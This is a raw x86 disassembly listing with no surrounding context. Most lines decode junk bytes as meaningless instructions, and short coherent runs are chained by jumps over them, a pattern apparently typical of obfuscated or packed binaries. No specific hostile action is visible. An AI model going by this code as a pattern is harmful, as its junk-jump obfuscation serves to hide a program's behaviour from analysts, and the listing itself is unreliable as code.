  425d15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d16:	pop    es
  425d17:	xchg   edi,eax
  425d18:	sbb    esi,ebp
  425d1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d1b:	mov    esi,0x5c26ee6f
  425d20:	icebp  
  425d21:	data16 fadd DWORD PTR [ebx+0x4851a7]
  425d28:	cs dec edx
  425d2a:	inc    esp
  425d2b:	or     BYTE PTR [esi],0xa8
  425d2e:	add    BYTE PTR [edx-0x2a32a585],dh
  425d34:	push   edx
  425d35:	pop    ebx
  425d36:	cmp    cl,BYTE PTR [eax]
  425d38:	dec    esp
  425d39:	pop    ebp
  425d3a:	dec    edi
  425d3b:	inc    ebp
  425d3c:	xor    esi,esi
  425d3e:	pop    ds
  425d3f:	adc    ebx,DWORD PTR [ebx]
  425d41:	arpl   ax,dx
  425d43:	adc    ah,BYTE PTR [esi+eiz*1-0x40]
  425d47:	inc    ebp
  425d48:	xlat   BYTE PTR ds:[ebx]
  425d49:	nop    DWORD PTR [esi-0x6a]
  425d4d:	(bad)  
  425d4e:	xor    dh,cl
  425d50:	es sbb al,0xb2
  425d53:	in     eax,dx
  425d54:	mov    ?,WORD PTR [ebx-0x7]
  425d57:	fwait
  425d58:	(bad)  
  425d59:	mov    BYTE PTR ss:[ebx-0x4f],dl
  425d5d:	pop    ecx
  425d5e:	sar    ebx,cl
  425d60:	inc    eax
  425d61:	addr16 inc esp
  425d63:	sbb    DWORD PTR [eax+0x5c7a8a4f],esp
  425d69:	in     eax,0x41
  425d6b:	pop    ss
  425d6c:	in     al,dx
  425d6d:	cmc    
  425d6e:	(bad)  
  425d6f:	ss xor eax,0x12e136ee
  425d75:	xor    al,0xf6
  425d77:	inc    edi
  425d78:	jae    0x425d0b
  425d7a:	mov    BYTE PTR [edx+ebp*2+0x4],ah
  425d7e:	ja     0x425d72
  425d80:	xor    eax,0x221956c3
  425d85:	dec    ecx
  425d86:	mov    eax,ds:0xcc13fd4a
  425d8b:	mov    eax,0xec4b8ed8
  425d90:	mov    ebx,0xb92b7880
  425d95:	or     DWORD PTR [edi-0x5ac51815],edi
  425d9b:	push   ecx
  425d9c:	xlat   BYTE PTR ds:[ebx]
  425d9d:	into   
  425d9e:	or     edx,DWORD PTR [edx]
  425da0:	sbb    eax,0xa8d02dd1
  425da5:	add    DWORD PTR [ecx+0x334cb],edi
  425dab:	push   edx
  425dac:	and    ah,ah
  425dae:	mov    al,ds:0x8471ef27
  425db3:	dec    ebp
  425db4:	std    
  425db5:	inc    DWORD PTR [ecx-0x71b7c2d]
  425dbb:	sub    esp,0xbc
  425dc1:	jmp    0x425ea1
  425dc6:	popa   
  425dc7:	jns    0x425d8b
  425dc9:	xchg   edx,ebx
  425dcb:	mov    edi,0x8b8aff65
  425dd0:	xor    esp,DWORD PTR es:[esi+eax*4]
  425dd4:	push   0x1bf779f
  425dd9:	add    bl,al
  425ddb:	add    BYTE PTR [eax],al
  425ddd:	add    cl,dh
  425ddf:	lock dec edx
  425de1:	icebp  
  425de2:	ds std 
  425de4:	cli    
  425de5:	push   esi
  425de6:	div    DWORD PTR [edi+0x76bede66]
  425dec:	daa    
  425ded:	jl     0x425ddd
  425def:	jg     0x425e2e
  425df1:	pushf  
  425df2:	jmp    0x98f31517
  425df7:	fs inc esi
  425df9:	mov    fs,WORD PTR [ebp+ebp*1-0x73b20051]
  425e00:	es sar ecx,cl
  425e03:	mov    ds:0x3b23b725,eax
  425e08:	sub    DWORD PTR [ecx-0x66ce98dd],edi
  425e0e:	ror    DWORD PTR [ebx+0x11],0x79
  425e12:	adc    eax,0xb721fd06
  425e17:	(bad)  
  425e18:	out    0xcf,eax
  425e1a:	mov    al,0x8e
  425e1c:	xchg   BYTE PTR [ebp-0x614c6153],al
  425e22:	and    al,0xd1
  425e24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e25:	xlat   BYTE PTR ds:[ebx]
  425e26:	cmp    edi,DWORD PTR [edx-0x9]
  425e29:	popf   
  425e2a:	dec    esp
  425e2b:	shl    esi,0x7e
  425e2e:	or     ch,dh
  425e30:	scas   eax,DWORD PTR es:[edi]
  425e31:	in     eax,0x8d
  425e33:	pop    ebp
  425e34:	lock dec edx
  425e36:	and    DWORD PTR [edx-0x7fadb06c],esp
  425e3c:	push   esi
  425e3d:	nop
  425e3e:	shrd   DWORD PTR [ecx+0x6244d36f],ebp,cl
  425e45:	loopne 0x425dc8
  425e47:	adc    al,0xcb
  425e49:	sub    ebp,eax
  425e4b:	int3   
  425e4c:	dec    ebp
  425e4d:	lds    esp,FWORD PTR [ebx+0x5ffd75bb]
  425e53:	cdq    
  425e54:	(bad)  
  425e55:	jl     0x425e59
  425e57:	jge    0x425e9c
  425e59:	cmc    
  425e5a:	retf   0xda59
  425e5d:	mov    eax,ds:0xbe2d57dd
  425e62:	nop
  425e63:	cmc    
  425e64:	lods   eax,DWORD PTR ds:[esi]
  425e65:	or     BYTE PTR [ebp-0x542c0a91],al
  425e6b:	scas   eax,DWORD PTR es:[edi]
  425e6c:	ds xchg ebp,eax
  425e6e:	or     eax,0xe12a53c6
  425e73:	xchg   bl,bh
  425e75:	ins    BYTE PTR es:[edi],dx
  425e76:	in     al,dx
  425e77:	dec    edi
  425e78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e79:	xchg   ebx,eax
  425e7a:	fs out 0x23,eax
  425e7d:	mov    eax,0xde4203d6
  425e82:	ret    0x5de2
  425e85:	jl     0x425e8f
  425e87:	outs   dx,DWORD PTR ds:[esi]
  425e88:	sar    bh,1
  425e8a:	pop    edx
  425e8b:	int    0xf5
  425e8d:	cmp    eax,0xe25bd29b
  425e92:	test   DWORD PTR [edx-0x617dd461],0x970bddf1
  425e9c:	mov    ebx,0x7df7aad5
  425ea1:	push   ebx
  425ea2:	push   esi
  425ea3:	jmp    0x425f83
  425ea8:	xor    esp,DWORD PTR [edx]
  425eaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425eab:	sub    al,0xb5
  425ead:	scas   al,BYTE PTR es:[edi]
  425eae:	mov    ebx,0xe60c453f
  425eb3:	int    0xed
  425eb5:	jnp    0x425ecc
  425eb7:	aas    
  425eb8:	cmp    al,al
  425eba:	add    DWORD PTR [eax],eax
  425ebc:	ret    
  425ebd:	add    BYTE PTR [eax],al
  425ebf:	add    BYTE PTR [esp+eiz*2],bl
  425ec2:	je     0x425e99
  425ec4:	and    eax,0xfc033434
  425ec9:	retf   0xae60
  425ecc:	movd   mm0,ebx
  425ecf:	gs pop ebp
  425ed1:	xchg   edx,eax
  425ed2:	add    esi,DWORD PTR [esp+0x4ed49f01]
  425ed9:	pcmpgtd mm0,QWORD PTR [edx+0x7]
  425edd:	fsub   st,st(3)
  425edf:	mul    BYTE PTR [edi]
  425ee1:	hlt    
  425ee2:	pushf  
  425ee3:	rol    BYTE PTR [ebx+0x7c31cde6],1
  425ee9:	fild   DWORD PTR [eax]
  425eeb:	xor    DWORD PTR [edx+0xc],ecx
  425eee:	scas   al,BYTE PTR es:[edi]
  425eef:	dec    ecx
  425ef0:	mov    cl,0x80
  425ef2:	shr    ecx,cl
  425ef4:	sbb    bl,BYTE PTR [eax+ecx*1+0x3b]
  425ef8:	ja     0x425eb7
  425efa:	ss pop edi
  425efc:	add    ebx,DWORD PTR [ecx]
  425efe:	dec    edi
  425eff:	or     ecx,ecx
  425f01:	clc    
  425f02:	rcr    DWORD PTR [edx],cl
  425f04:	ret    
  425f05:	or     BYTE PTR [edx-0xcaff45b],cl
  425f0b:	sub    eax,0xe3c77bc0
  425f10:	out    0x68,eax
  425f12:	dec    eax
  425f13:	pop    esp
  425f14:	or     DWORD PTR [ecx],ebx
  425f16:	adc    al,0xa6
  425f18:	xor    al,0xe
  425f1a:	lods   eax,DWORD PTR ds:[esi]
  425f1b:	cmp    al,0x48
  425f1d:	push   eax
  425f1e:	and    esi,ecx
  425f20:	pop    es
  425f21:	add    dl,dl
  425f23:	mov    ch,0x6c
  425f25:	xchg   esi,eax
  425f26:	fs test al,0x5b
  425f29:	aam    0x8b
  425f2b:	jns    0x425eed
  425f2d:	out    0xc9,eax
  425f2f:	mov    ebp,0x5563c374
  425f34:	add    ebp,DWORD PTR gs:[esi+0x5c]
  425f38:	(bad)  
  425f39:	mov    ch,0xdf
  425f3b:	sub    al,0xe5
  425f3d:	imul   ebp,DWORD PTR [edx+0x55],0x59
  425f41:	push   ds
  425f42:	dec    ebp
  425f43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f44:	cmp    eax,0xb45f7d33
  425f4a:	sbb    BYTE PTR [edx],al
  425f4c:	fs dec ecx
  425f4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425f4f:	es (bad) 
  425f51:	jg     0x425f26
  425f53:	xor    al,0x3f
  425f55:	xlat   BYTE PTR ds:[ebx]
  425f56:	stos   DWORD PTR es:[edi],eax
  425f57:	loop   0x425f38
  425f59:	sbb    DWORD PTR [ebx+edi*8],ebp
  425f5c:	data16 jo 0x425f9f
  425f5f:	push   es
  425f60:	dec    ebx
  425f61:	add    edx,DWORD PTR [esi-0x1e63851e]
  425f67:	adc    al,BYTE PTR [edx-0x5d]
  425f6a:	cmp    eax,0x9b9c87a2
  425f6f:	or     DWORD PTR [eax-0x28],edx
  425f72:	dec    ebp
  425f73:	sub    BYTE PTR [ebp+0x5b],bl
  425f76:	jnp    0x425fef
  425f78:	dec    ebx
  425f79:	retf   
  425f7a:	ja     0x425ffb
  425f7c:	rcl    BYTE PTR [ebx+edx*2],cl
  425f7f:	adc    eax,edi
  425f81:	out    0x73,eax
  425f83:	push   edi
  425f84:	push   0x0
  425f86:	jmp    0x426066
  425f8b:	sub    DWORD PTR [edi+0x6adf2ad7],esi
  425f91:	std    
  425f92:	mov    bh,0x8c
  425f94:	sub    al,0xd9
  425f96:	xor    ecx,DWORD PTR [edi+0x66]
  425f99:	fs xor edi,ebp
  425f9c:	rol    BYTE PTR [ecx],0x0
  425f9f:	ret    
  425fa0:	add    BYTE PTR [eax],al
  425fa2:	add    dl,cl
  425fa4:	adc    edx,DWORD PTR [esp+ebp*4+0x55799052]
  425fab:	loop   0x425f30
  425fad:	cdq    
  425fae:	es sti 
  425fb0:	mov    cl,0x71
  425fb2:	mov    cl,0x40
  425fb4:	ret    
  425fb5:	xor    BYTE PTR [ebp+0x2f],dl
  425fb8:	xor    al,0xe0
  425fba:	out    dx,al
  425fbb:	jnp    0x426008
  425fbd:	xchg   ecx,eax
  425fbe:	mov    bl,0x9e
  425fc0:	jmp    0xe69313e3
  425fc5:	lahf   
  425fc6:	mov    bl,0xe2
  425fc8:	inc    ecx
  425fc9:	mov    al,0x77
  425fcb:	sar    ebx,cl
  425fcd:	push   0xfffffff1
  425fcf:	and    dh,BYTE PTR [eax+eax*1-0x6d]
  425fd3:	mov    bl,BYTE PTR [esi]
  425fd5:	sub    DWORD PTR ds:0xaa47dd09,eax
  425fdb:	pop    ss
  425fdc:	adc    al,0x7
  425fde:	adc    eax,0xc91beba2
  425fe3:	inc    ecx
  425fe4:	not    DWORD PTR [ecx+0x29]
  425fe7:	or     al,BYTE PTR [eax+0x11]
  425fea:	push   ss
  425feb:	fwait
  425fec:	shl    esp,0xda
  425fef:	pop    ds
  425ff0:	sub    al,0x5a
  425ff2:	mov    esp,0xc3d1c07d
  425ff7:	fucomi st,st(7)
  425ff9:	xchg   ebp,eax
  425ffa:	dec    ebp
  425ffb:	push   eax
  425ffc:	les    ecx,FWORD PTR [esp+eiz*8-0xf]
  426000:	xor    eax,edx
  426002:	cmp    DWORD PTR [edx-0x6439912d],esp
  426008:	adc    al,0x9e
  42600a:	mov    esi,DWORD PTR [ecx+0xc]
  42600d:	js     0x426015
  42600f:	jg     0x425ff9
  426011:	ds xchg esp,eax
  426013:	call   0xf21293a4
  426018:	inc    esp
  426019:	outs   dx,BYTE PTR ds:[esi]
  42601a:	pushf  
  42601b:	or     eax,0xfdb4d6fc
  426020:	ins    DWORD PTR es:[edi],dx
  426021:	(bad)  
  426022:	out    0xe2,al
  426024:	add    al,0xd9
  426026:	jns    0x4260a5
  426028:	jmp    DWORD PTR [ebx-0x6376789e]
  42602e:	stos   BYTE PTR es:[edi],al
  42602f:	and    BYTE PTR [ecx+0x1d0c47e5],al
  426035:	ins    BYTE PTR es:[edi],dx
  426036:	cmp    edi,DWORD PTR [esp+edi*8]
  426039:	and    cl,dl
  42603b:	pop    esi
  42603c:	or     ebp,ebp
  42603e:	sub    DWORD PTR [edi+0x607e844d],ebp
  426044:	inc    ebp
  426045:	test   al,0xc9
  426047:	ds xchg edi,eax
  426049:	mov    DWORD PTR [ebx+edi*8-0x29],edx
  42604d:	imul   esp,DWORD PTR [eax],0xffffffc5
  426050:	jp     0x426071
  426052:	repz dec edx
  426054:	out    dx,eax
  426055:	pop    ss
  426056:	test   eax,0x526e847f
  42605b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42605c:	push   esp
  42605d:	mov    ds:0xbfdc3555,eax
  426062:	mov    cl,0x52
  426064:	inc    ebp
  426065:	xchg   esi,eax
  426066:	mov    esi,0x4332d8
  42606b:	jmp    0x42614b
  426070:	push   ebx
  426071:	call   0xe0023ba2
  426076:	imul   eax
  426078:	ret    0xb8a8
  42607b:	or     eax,0xde34684e
  426080:	rol    cl,0x1
  426083:	add    bl,al
  426085:	add    BYTE PTR [eax],al
  426087:	add    BYTE PTR [edi],dh
  426089:	data16 xor BYTE PTR [esi],0xac
  42608d:	into   
  42608e:	mov    ebx,0x21f300ac
  426093:	xchg   ebx,eax
  426094:	xor    cl,BYTE PTR [ebx+0x5792dbe4]
  42609a:	add    dh,dl
  42609c:	outs   dx,BYTE PTR ds:[esi]
  42609d:	pop    ebp
  42609e:	inc    eax
  42609f:	addr16 jle 0x4260a8
  4260a2:	or     al,0x1f
  4260a4:	add    ch,BYTE PTR [edx+0x5f]
  4260a7:	mov    ?,WORD PTR [edx]
  4260a9:	sbb    BYTE PTR [ecx],ah
  4260ab:	xchg   BYTE PTR [ebp-0x4b],dh
  4260ae:	and    BYTE PTR [ebx+eiz*8-0x1f],al
  4260b2:	repz push ds
  4260b4:	sbb    bh,BYTE PTR [ebx]
  4260b6:	cwde   
  4260b7:	mov    edi,ebp
  4260b9:	jp     0x4260a0
  4260bb:	dec    eax
  4260bc:	xor    bh,BYTE PTR ds:0xf51bd7e4
  4260c2:	in     eax,0xd
  4260c4:	aad    0x5a
  4260c6:	xchg   ebp,eax
  4260c7:	enter  0x3a64,0x23
  4260cb:	outs   dx,BYTE PTR ds:[esi]
  4260cc:	data16 fsubr DWORD PTR ds:0x91c47e30
  4260d3:	pop    esp
  4260d4:	xchg   DWORD PTR [edx],edi
  4260d6:	push   0xffffff8c
  4260d8:	pop    ss
  4260d9:	out    0xc7,eax
  4260db:	mov    edx,0x83eac4c7
  4260e0:	sub    al,0xed
  4260e2:	xor    eax,0xae338472
  4260e7:	push   ebp
  4260e8:	jo     0x42607f
  4260ea:	push   ss
  4260eb:	jne    0x42610f
  4260ed:	push   ebx
  4260ee:	pop    edi
  4260ef:	adc    DWORD PTR [ebx-0x4e4774f8],ebp
  4260f5:	rol    cl,cl
  4260f7:	mov    dh,0xda
  4260f9:	jmp    0xddc7:0xb84c2e2f
  426100:	sub    al,0xa7
  426102:	or     dl,BYTE PTR [edx+0x3a]
  426105:	lods   eax,DWORD PTR ds:[esi]
  426106:	fwait
  426107:	add    al,0xe7
  426109:	gs mov esi,0xffd03c3f
  42610f:	sti    
  426110:	(bad)  
  426112:	adc    eax,0x8c9442a1
  426117:	test   al,0x58
  426119:	cwde   
  42611a:	add    BYTE PTR [edx+ecx*4],0xde
  42611e:	out    dx,eax
  42611f:	ret    
  426120:	mov    WORD PTR [ebx-0x2f],gs
  426123:	arpl   WORD PTR gs:[bx+si+0x28],di
  426128:	jge    0x4260f0
  42612a:	jns    0x426101
  42612c:	test   BYTE PTR [eax+eiz*8],bh
  42612f:	gs jecxz 0x426197
  426132:	mov    eax,DWORD PTR [esi+ebx*1]
  426135:	or     eax,0x7c0ff87d
  42613a:	or     DWORD PTR [eax-0x46a45919],0x38202e7f
  426144:	sar    ebp,1
  426146:	shl    BYTE PTR [esi],0xd2
  426149:	ja     0x426162
  42614b:	push   esi
  42614c:	push   0x0
  42614e:	call   DWORD PTR ds:0x43c7e4
  426154:	mov    al,BYTE PTR [eax+0x1]
  426157:	cmp    al,BYTE PTR ds:0x4332da
  42615d:	je     0x42616b
  426163:	xor    eax,eax
  426165:	inc    eax
  426166:	jmp    0x42d688
  42616b:	and    DWORD PTR ds:0x433564,0x1b6e
  426175:	push   esi
  426176:	add    DWORD PTR ds:0x433598,0x2352
  426180:	lea    eax,[esp+0x8c]
  426187:	sbb    DWORD PTR ds:0x433668,0x4335b0
  426191:	push   eax
  426192:	call   DWORD PTR ds:0x43c800
  426198:	mov    DWORD PTR ds:0x433614,0x7a14
  4261a2:	mov    al,BYTE PTR [eax]
  4261a4:	cmp    al,BYTE PTR ds:0x4332d8
  4261aa:	mov    DWORD PTR ds:0x433628,0x190e
  4261b4:	jne    0x426163
  4261ba:	jmp    0x42629a
  4261bf:	inc    ebx
  4261c0:	mov    ds:0xbff81f18,eax
  4261c5:	inc    edi
  4261c6:	dec    DWORD PTR [edx+edx*2+0x37]
  4261ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261cb:	mov    bh,0x6d
  4261cd:	dec    ebp
  4261ce:	mov    edi,0x1c283
  4261d3:	ret    
  4261d4:	add    BYTE PTR [eax],al
  4261d6:	add    BYTE PTR [ecx],dh
  4261d8:	mov    bl,0xd4
  4261da:	cmp    al,ah
  4261dc:	call   ecx
  4261de:	leave  
  4261df:	or     al,0xc4
  4261e1:	enter  0xb862,0x5d
  4261e5:	push   es
  4261e6:	pop    es
  4261e7:	test   eax,0x9f8c210
  4261ec:	push   eax
  4261ed:	pop    ecx
  4261ee:	mov    edi,DWORD PTR [edi]
  4261f0:	lea    esi,[edi]
  4261f2:	lahf   
  4261f3:	out    0x5a,eax
  4261f5:	cmp    al,0x29
  4261f7:	ja     0x426271
  4261f9:	pop    edi
  4261fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261fb:	dec    esp
  4261fc:	loop   0x426201
  4261fe:	ss cmp bh,bl
  426201:	js     0x4261b3
  426203:	shl    BYTE PTR [ebx+0xf],cl
  426206:	cbw    
  426208:	lea    esi,[esi+0x7f99aa51]
  42620e:	jg     0x426279
  426210:	popa   
  426211:	xor    eax,DWORD PTR [esi+0x35ba8d01]
  426217:	jb     0x426217
  426219:	xchg   edx,eax
  42621a:	test   eax,0xe00e9b5a
  42621f:	xchg   DWORD PTR [edi],esi
  426221:	add    DWORD PTR [esi+eax*2-0x37e6ab65],esi
  426228:	sbb    dh,BYTE PTR [edi+0x7e936812]
  42622e:	sbb    DWORD PTR [ebp-0x3288940d],ebx
  426234:	inc    edx
  426235:	ds mov bh,0xd7
  426238:	sub    al,BYTE PTR [esi-0x1d965eac]
  42623e:	xor    al,0x2a
  426240:	fcom   QWORD PTR [esi+0x64]
  426243:	mov    esi,0x690d5e07
  426248:	xchg   ecx,eax
  426249:	mov    ah,0x20
  42624b:	pop    esi
  42624c:	jge    0x42629b
  42624e:	icebp  
  42624f:	xor    DWORD PTR [ecx-0x7d59726e],esp
  426255:	cli    
  426256:	xchg   ebx,eax
  426257:	mov    eax,edi
  426259:	hlt    
  42625a:	push   cs
  42625b:	test   BYTE PTR [ebx+ebx*8],bh
  42625e:	mov    al,ds:0xd26d102f
  426263:	adc    al,0x19
  426265:	push   ss
  426266:	aas    
  426267:	pop    ecx
  426268:	ins    BYTE PTR es:[edi],dx
  426269:	push   eax
  42626a:	or     al,0xb2
  42626c:	pop    eax
  42626d:	in     al,0x3e
  42626f:	fdiv   QWORD PTR [edi+0x5]
  426272:	lods   al,BYTE PTR ds:[esi]
  426273:	call   eax
  426275:	cdq    
  426276:	call   0x8ccf:0xa6d4ab1f
  42627d:	pushw  0xff85
  426280:	out    dx,eax
  426281:	adc    ebx,DWORD PTR [eax+ebp*8+0x9]
  426285:	test   BYTE PTR [bx+0xa],dl
  426289:	push   ds
  42628a:	xor    dh,0xc2
  42628d:	(bad)  
  42628f:	rol    BYTE PTR [ebx+0x6a93a9d],1
  426295:	jge    0x4262fb
  426297:	pusha  
  426298:	int    0xd9
  42629a:	mov    DWORD PTR [esp+0x10],0xebeb4fd3
  4262a2:	jmp    0x426382
  4262a7:	sbb    edx,esp
  4262a9:	push   edi
  4262aa:	sahf   
  4262ab:	fistp  WORD PTR [edi+0x497cd5db]
  4262b1:	les    esi,FWORD PTR [edi+ebx*2-0x1b]
  4262b5:	test   BYTE PTR ds:0x1c346,cl
  4262bb:	ret    
  4262bc:	add    BYTE PTR [eax],al
  4262be:	add    BYTE PTR ds:0x31fcb353,ah
  4262c4:	jmp    0x42631e
  4262c6:	and    DWORD PTR [ecx+0x5409b299],0x6b
  4262cd:	bound  esp,QWORD PTR [esp+ecx*2+0x5f]
  4262d1:	sbb    ch,cl
  4262d3:	pushf  
  4262d4:	cld    
  4262d5:	ret    
  4262d6:	ja     0x426341
  4262d8:	ret    0x1e82
  4262db:	aad    0xd5
  4262dd:	inc    esp
  4262de:	jl     0x426312
  4262e0:	in     al,0xe9
  4262e2:	xor    al,0xc9
  4262e4:	xchg   ebx,eax
  4262e5:	test   BYTE PTR [ecx+0x12],dl
  4262e8:	shr    DWORD PTR [ebp+0x47],1
  4262eb:	push   es
  4262ec:	iret   
  4262ed:	jae    0x4262a3
  4262ef:	and    dh,bl
  4262f1:	mov    ebp,0xca86a4ef
  4262f6:	repnz mov esp,ebp
  4262f9:	push   edx
  4262fa:	push   esp
  4262fb:	test   DWORD PTR [ecx-0x1e36cd7b],esp
  426301:	sub    al,0x9
  426303:	inc    ecx
  426304:	push   ss
  426305:	ds inc ecx
  426307:	nop
  426308:	dec    ebx
  426309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42630a:	push   0x177d5f22
  42630f:	mov    ebp,0xc6090eb3
  426314:	xchg   ebx,eax
  426315:	jmp    DWORD PTR [esi-0x73cc9b58]
  42631b:	dec    esp
  42631c:	out    dx,eax
  42631d:	ss retf 
  42631f:	adc    BYTE PTR [edi+0x61db330a],cl
  426325:	cmp    dh,BYTE PTR [esi]
  426327:	in     eax,0x78
  426329:	add    BYTE PTR [esi+0x59],0x90
  42632d:	xchg   esi,eax
  42632e:	mov    bh,0x34
  426330:	xchg   ecx,eax
  426331:	mov    dh,0x37
  426333:	mov    ch,0x68
  426335:	mov    al,ds:0x515369bc
  42633a:	imul   eax,DWORD PTR [edx+0x5257afe],0x7cafdc3a
  426344:	mov    BYTE PTR [esi+0x6],cl
  426347:	das    
  426348:	ffree  st(0)
  42634a:	cmp    BYTE PTR [ebp-0x20],al
  42634d:	call   0x3144e688
  426352:	test   BYTE PTR [ebx],ch
  426354:	xchg   ebx,eax
  426355:	imul   ecx,DWORD PTR [edi+0x4d140364],0xa0da164
  42635f:	or     al,0x6d
  426361:	cmp    al,0xb
  426363:	cld    
  426364:	dec    edx
  426365:	jecxz  0x4263d8
  426367:	(bad)  
  426368:	pop    ebp
  426369:	in     al,dx
  42636a:	dec    esi
  42636b:	cmp    eax,0x800d8b4b
  426370:	jmp    0x42637f
  426372:	stos   DWORD PTR es:[edi],eax
  426373:	jae    0x42637e
  426375:	push   edx
  426376:	mov    ebp,0x7d9c9182
  42637b:	loope  0x426315
  42637d:	pushf  
  42637e:	call   0xbb987a81
  426383:	(bad)  
  426385:	(bad)  
  426386:	inc    DWORD PTR [ebx+0x4336003d]
  42638c:	add    BYTE PTR [eax],al
  42638e:	jl     0x4263a8
  426394:	adc    DWORD PTR ds:0x433608,edx
  42639a:	jmp    0x4263a8
  42639f:	push   DWORD PTR [ebp-0x18]
  4263a2:	call   DWORD PTR ds:0x43c808
  4263a8:	mov    DWORD PTR [esp+0x14],ebx
  4263ac:	mov    DWORD PTR [esp+0x58],0xebeb4fd4
  4263b4:	mov    DWORD PTR [esp+0x5c],ebx
  4263b8:	lea    eax,[esp+0x64]
  4263bc:	jmp    0x42649c
  4263c1:	retf   0xb4c1
  4263c4:	push   ds
  4263c5:	mov    edi,0x6dd5ea7f
  4263ca:	out    dx,eax
  4263cb:	pop    ebx
  4263cc:	dec    esi
  4263cd:	push   0x959e9d8
  4263d2:	les    eax,FWORD PTR [ecx]
  4263d4:	add    bl,al
  4263d6:	add    BYTE PTR [eax],al
  4263d8:	add    bl,al
  4263da:	ds (bad) 
  4263dc:	rol    BYTE PTR [esi],1
  4263de:	xor    eax,DWORD PTR [edx-0x3b]
  4263e1:	mov    ?,esp
  4263e3:	xchg   esp,eax
  4263e4:	jl     0x4263ea
  4263e6:	mov    al,ds:0x42738a3c
  4263eb:	mov    ebx,0x6e8c029d
  4263f0:	pop    ds
  4263f1:	rdmsr  
  4263f3:	mov    eax,0x3b7e1ded
  4263f8:	sbb    ah,dh
  4263fa:	xor    al,0x6c
  4263fc:	inc    esi
  4263fd:	out    dx,eax
  4263fe:	imul   ebp,DWORD PTR [eax],0xffffffc4
  426401:	fld    QWORD PTR [ebx+0x16]
  426404:	mov    ah,0x57
  426406:	sbb    ch,dl
  426408:	mov    DWORD PTR fs:[esi-0x3f],eax
  42640c:	scas   eax,DWORD PTR es:[edi]
  42640d:	into   
  42640e:	jg     0x4263a7
  426410:	iret   
  426411:	add    DWORD PTR [edx],eax
  426413:	(bad)  [ecx-0x1b]
  426416:	jo     0x4263f0
  426418:	push   esi
  426419:	in     al,0xff
  42641b:	sbb    edx,edi
  42641d:	sub    BYTE PTR [eax+0x4f],ah
  426420:	xor    ah,BYTE PTR [esp+eax*2+0x72f4a853]
  426427:	push   eax
  426428:	mov    cl,0x1f
  42642a:	sbb    al,BYTE PTR [esi]
  42642c:	and    ebp,DWORD PTR [edi-0x74]
  42642f:	inc    edx
  426430:	adc    eax,0x63eeae03
  426435:	dec    BYTE PTR [ecx-0x4f1c8324]
  42643b:	inc    ecx
  42643c:	mov    ecx,DWORD PTR [edi-0x74724435]
  426442:	sbb    DWORD PTR [ebx+0x48],ebp
  426445:	hlt    
  426446:	xor    al,0xef
  426448:	ins    DWORD PTR es:[edi],dx
  426449:	fsub   QWORD PTR [edi+0x2a]
  42644c:	and    ecx,DWORD PTR ds:0x31ac1a21
  426452:	jle    0x426407
  426454:	nop
  426455:	rcr    DWORD PTR [esi+edi*4],1
  426458:	cmp    DWORD PTR [ebx-0x2171401d],esp
  42645e:	test   eax,0x1ea01a6a
  426463:	push   eax
  426464:	dec    ecx
  426465:	jp     0x426410
  426467:	cmp    eax,0x6daa56c5
  42646c:	xlat   BYTE PTR ds:[ebx]
  42646d:	popa   
  42646e:	add    eax,0x6054478c
  426473:	test   al,0x44
  426475:	cmp    BYTE PTR [eax],0x3e
  426478:	inc    ecx
  426479:	xor    BYTE PTR [eax],ah
  42647b:	cli    
  42647c:	lods   eax,DWORD PTR ds:[esi]
  42647d:	or     DWORD PTR [esi+0x14],ebx
  426480:	sbb    edx,esi
  426482:	pop    edi
  426483:	fisubr WORD PTR [ebp-0x26]
  426486:	in     al,0x71
  426488:	mov    al,ds:0x7ed6b22f
  42648d:	or     BYTE PTR [edi],0xdf
  426490:	(bad)  
  426491:	xor    esi,DWORD PTR ds:0x65a5944f
  426497:	and    al,0x5f
  426499:	jne    0x426427
  42649b:	xchg   BYTE PTR [ecx-0x72dfdbbc],cl
  4264a1:	inc    esp
  4264a2:	and    al,0x70
  4264a4:	mov    DWORD PTR [esp+0x28],eax
  4264a8:	jmp    0x426588
  4264ad:	aaa    
  4264ae:	jae    0x426524
  4264b0:	push   edx
  4264b1:	je     0x42650a
  4264b3:	aaa    
  4264b4:	ja     0x4264c0
  4264b6:	(bad)  
  4264b7:	out    0x2,eax
  4264b9:	or     BYTE PTR [esi+0x2e],dl
  4264bc:	add    cl,ah
  4264be:	les    eax,FWORD PTR [ecx]
  4264c0:	add    bl,al
  4264c2:	add    BYTE PTR [eax],al
  4264c4:	add    BYTE PTR [ebx-0x6e],ch
  4264c7:	adc    al,BYTE PTR [ecx-0x5c]
  4264ca:	fwait
  4264cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4264cc:	hlt    
  4264cd:	jo     0x426543
  4264cf:	inc    ecx
  4264d0:	scas   eax,DWORD PTR es:[edi]
  4264d1:	cdq    
  4264d2:	inc    edx
  4264d3:	int    0x3c
  4264d5:	sbb    bl,BYTE PTR [eax-0x61]
  4264d8:	in     eax,dx
  4264d9:	or     ah,BYTE PTR [esi+ebp*2+0xe3f53da]
  4264e0:	imul   eax,DWORD PTR [ebx],0xffffffdc
  4264e3:	inc    ebp
  4264e4:	jecxz  0x42653b
  4264e6:	stos   BYTE PTR es:[edi],al
  4264e7:	pop    esi
  4264e8:	lahf   
  4264e9:	cmp    al,0x7c
  4264eb:	ja     0x42651d
  4264ed:	repnz push edi
  4264ef:	(bad)
  4264f3:	scas   eax,DWORD PTR es:[edi]
  4264f4:	push   ss
  4264f5:	cdq    
  4264f6:	push   0xfffffffa
  4264f8:	ja     0x4264de
  4264fa:	mov    eax,0xf6302e35
  4264ff:	xor    al,0x94
  426501:	leave  
  426502:	fisttp WORD PTR [esi]
  426504:	shr    DWORD PTR [esi],cl
  426506:	sub    BYTE PTR [edi],bl
  426508:	cmp    al,0x2e
  42650a:	rcr    BYTE PTR [esi-0x11],0xd3
  42650e:	push   edi
  42650f:	aam    0x6f
  426511:	xor    al,0xc5
  426513:	aad    0x41
